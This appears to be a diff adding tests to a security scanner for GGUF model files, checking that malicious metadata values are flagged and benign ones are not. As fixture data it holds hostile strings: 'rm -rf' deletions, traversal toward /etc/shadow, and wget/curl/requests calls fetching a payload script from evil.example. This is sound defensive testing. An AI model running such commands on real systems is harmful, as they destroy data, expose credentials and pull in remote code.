@@ -1,6 +1,7 @@
 """Comprehensive tests for the GGUF scanner."""
 
 import struct
+import time
 from pathlib import Path
 from typing import Any
 
@@ -1106,11 +1107,14 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
     ("key", "value", "evidence_type"),
     [
         ("command", "rm -rf /tmp/model-cache", "command_execution"),
+        ("command", "sudo rm -rf /tmp/model-cache", "command_execution"),
         ("loader", "subprocess.run(['id'])", "command_execution"),
         ("payload_path", "../tmp/../../payload.bin", "path_traversal"),
         ("encoded_payload", "%2E%2e/%2e%2e/etc/shadow", "path_traversal"),
         ("download", "wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
+        ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("callback", "requests.get('https://evil.example/payload')", "remote_fetch"),
+        ("callback", 'requests.get(url="https://evil.example/payload")', "remote_fetch"),
     ],
 )
 def test_gguf_metadata_value_requires_concrete_security_evidence(
@@ -1127,6 +1131,47 @@ def test_gguf_metadata_value_requires_concrete_security_evidence(
     assert checks
     assert any(check.details["evidence_type"] == evidence_type for check in checks)
     assert all(check.rule_code == "S902" for check in checks)
+
+
+def test_gguf_metadata_value_security_evidence_handles_adversarial_punctuation_quickly() -> None:
+    malicious = "curl " + "-! " * 20_000 + "https://evil.example/payload.sh"
+    benign = ("repository/name | tokenizer/path; " * 20_000) + "https://huggingface.co/org/model"
+
+    start = time.perf_counter()
+    malicious_evidence = GgufScanner._metadata_value_security_evidence("download", malicious)
+    benign_evidence = GgufScanner._metadata_value_security_evidence("description", benign)
+    elapsed = time.perf_counter() - start
+
+    assert any(evidence["evidence_type"] == "remote_fetch" for evidence in malicious_evidence)
+    assert benign_evidence == []
+    assert elapsed < 1.0
+
+
+def test_gguf_metadata_concrete_evidence_end_to_end_regressions(tmp_path: Path) -> None:
+    malicious_path = create_mock_gguf(
+        tmp_path / "malicious-metadata.gguf",
+        metadata={"download": "curl -o /tmp/payload.sh https://evil.example/payload.sh"},
+    )
+    benign_path = create_mock_gguf(
+        tmp_path / "benign-metadata-e2e.gguf",
+        metadata={
+            "general.base_model.0.repo_url": "https://huggingface.co/google/gemma-4-12B-it",
+            "tokenizer.chat_template": "{% for message in messages %}{{ message['content'] | trim }}{% endfor %}",
+        },
+    )
+
+    malicious_direct = GgufScanner().scan(str(malicious_path))
+    benign_direct = GgufScanner().scan(str(benign_path))
+    malicious_aggregate = scan_model_directory_or_file(str(malicious_path), cache_enabled=False)
+    benign_aggregate = scan_model_directory_or_file(str(benign_path), cache_enabled=False)
+
+    assert any(
+        check.details["evidence_type"] == "remote_fetch" for check in _failed_metadata_value_checks(malicious_direct)
+    )
+    assert _failed_metadata_value_checks(benign_direct) == []
+    assert any(issue.rule_code == "S902" and "download" in issue.message for issue in malicious_aggregate.issues)
+    assert not any(issue.rule_code == "S902" for issue in benign_aggregate.issues)
+    assert determine_exit_code(benign_aggregate) == 0
 
 
 def test_gguf_chat_template_command_payload_still_uses_jinja_analysis(tmp_path: Path) -> None:
